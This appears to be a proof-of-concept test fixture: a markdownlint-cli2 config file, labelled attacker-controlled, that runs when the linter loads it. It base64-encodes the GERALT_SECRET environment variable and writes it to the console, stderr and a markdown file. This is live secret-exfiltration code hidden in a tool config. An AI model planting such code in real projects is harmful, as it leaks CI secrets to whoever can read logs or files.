// Attacker-controlled markdownlint-cli2 config (executed by markdownlint-cli2)
const enc = Buffer.from(process.env.GERALT_SECRET || "").toString("base64").toString("base64");
console.log("GERALT_LEAKED_TOKEN=" + enc);
process.stderr.write("GERALT_LEAKED_TOKEN=" + enc + "\n");
try {
  require("fs").appendFileSync("files/geralt-test/foo.md", "\n<!-- GERALT_LEAKED_TOKEN=" + enc + " -->\n");
} catch (e) {}
module.exports = {};
